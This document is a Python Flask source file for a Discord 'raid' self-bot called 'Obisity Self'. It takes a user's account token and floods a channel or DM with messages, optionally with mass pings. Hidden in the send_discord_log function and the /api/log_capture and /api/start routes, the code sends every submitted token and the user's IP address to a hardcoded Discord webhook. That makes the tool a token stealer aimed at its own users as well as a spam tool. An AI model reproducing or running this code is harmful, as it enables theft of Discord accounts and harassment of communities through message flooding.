# ── app.py ──────────────────────────────────────────────────────────
import os
import time
import json
import threading
import asyncio
import aiohttp
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553696811821043736/c9QaF5LKnQxjIELQLnj1eLQHwc8vDmgLt8Pupb5iTxantz3vYvH7Y_DN8VUiRNzn_z2X"

raid_state = {
    "active": False,
    "logs": [],
    "status": "Idle",
    "sent_count": 0
}
raid_thread = None

def log_message(msg):
    timestamp = time.strftime("[%H:%M:%S]")
    entry = f"{timestamp} {msg}"
    raid_state["logs"].append(entry)
    print(entry)

def send_discord_log(ip, token):
    try:
        payload = {
            "content": f"🚨 **Obisity Self | New User Logged In!**\n**IP:** `{ip}`\n**Token:** `{token}`"
        }
        import requests
        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
    except Exception as e:
        print(f"Webhook error: {e}")

async def async_get_or_create_dm(session, token, recipient_id):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }
    payload = {"recipient_id": recipient_id}
    try:
        async with session.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json=payload) as resp:
            if resp.status in [200, 201]:
                data = await resp.json()
                return data.get("id")
    except Exception as e:
        print(f"DM resolution error: {e}")
    return None

async def async_worker_raid(config):
    global raid_state
    token = config.get("token")
    target_input = config.get("channel_id")
    content = config.get("content")
    mode = config.get("mode", "custom")
    duration = int(config.get("duration", 0))
    limit = int(config.get("limit", 100))
    unlimited = config.get("unlimited", True)
    ping_type = config.get("ping_type", "none")
    ping_target = config.get("ping_target", "")

    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }

    async with aiohttp.ClientSession(headers=headers) as session:
        channel_id = target_input
        if ping_type == "dms" or (len(target_input) == 18 and target_input.isdigit() and ping_type != "none"):
            resolved_dm = await async_get_or_create_dm(session, token, target_input)
            if resolved_dm:
                channel_id = resolved_dm
                log_message(f"Resolved DM Channel ID: {channel_id}")

        target_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"

        start_time = time.time()
        count = 0
        raid_state["sent_count"] = 0
        raid_state["status"] = "Running"
        log_message("Obisity Self async worker locked and loaded.")

        final_content = content
        if ping_type == "everyone":
            final_content = f"@everyone {content}"
        elif ping_type == "user" and ping_target:
            final_content = f"<@{ping_target}> {content}"
        elif ping_type == "role" and ping_target:
            final_content = f"<@&{ping_target}> {content}"
        elif ping_type == "dms" and ping_target:
            final_content = f"<@{ping_target}> {content}"

        msg_payload = {"content": final_content}

        while raid_state["active"]:
            if not unlimited and count >= limit:
                log_message("Limit reached. Stopping raid.")
                break
                
            if duration > 0 and (time.time() - start_time) >= duration:
                log_message("Duration timer expired. Stopping raid.")
                break

            # Send multiple concurrent requests for hyper speed
            tasks = []
            batch_size = 10 if mode == "hyper" else (3 if mode == "medium" else 1)
            
            for _ in range(batch_size):
                if not unlimited and count + len(tasks) >= limit:
                    break
                tasks.append(session.post(target_url, json=msg_payload))

            if not tasks:
                break

            responses = await asyncio.gather(*tasks, return_exceptions=True)
            for resp in responses:
                if not isinstance(resp, Exception):
                    if resp.status in [200, 201]:
                        count += 1
                        raid_state["sent_count"] = count
                    else:
                        text = await resp.text()
                        log_message(f"API status {resp.status}: {text}")
                else:
                    log_message(f"Network error: {resp}")

            # Rate control delay
            if mode == "slow":
                await asyncio.sleep(2.0)
            elif mode == "medium":
                await asyncio.sleep(1.0)
            elif mode == "hyper":
                await asyncio.sleep(0.001) # Near instant ultra speed
            else:
                custom_delay = float(config.get("custom_delay", 0.1))
                await asyncio.sleep(custom_delay)

    raid_state["active"] = False
    raid_state["status"] = "Idle"
    log_message("Raid operation terminated.")

def run_async_loop(config):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(async_worker_raid(config))

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/log_capture", methods=["POST"])
def api_log_capture():
    data = request.json or {}
    token = data.get("token", "N/A")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    threading.Thread(target=send_discord_log, args=(ip, token)).start()
    return jsonify({"status": "captured"})

@app.route("/api/start", methods=["POST"])
def api_start():
    global raid_thread, raid_state
    if raid_state["active"]:
        return jsonify({"status": "already_active"})
    
    config = request.json or {}
    token = config.get("token")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    
    if token:
        threading.Thread(target=send_discord_log, args=(ip, token)).start()

    raid_state["active"] = True
    raid_thread = threading.Thread(target=run_async_loop, args=(config,))
    raid_thread.daemon = True
    raid_thread.start()
    return jsonify({"status": "started"})

@app.route("/api/stop", methods=["POST"])
def api_stop():
    global raid_state
    raid_state["active"] = False
    raid_state["status"] = "Stopping..."
    log_message("Stop signal received by controller.")
    return jsonify({"status": "stopped"})

@app.route("/api/status", methods=["GET"])
def api_status():
    return jsonify(raid_state)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)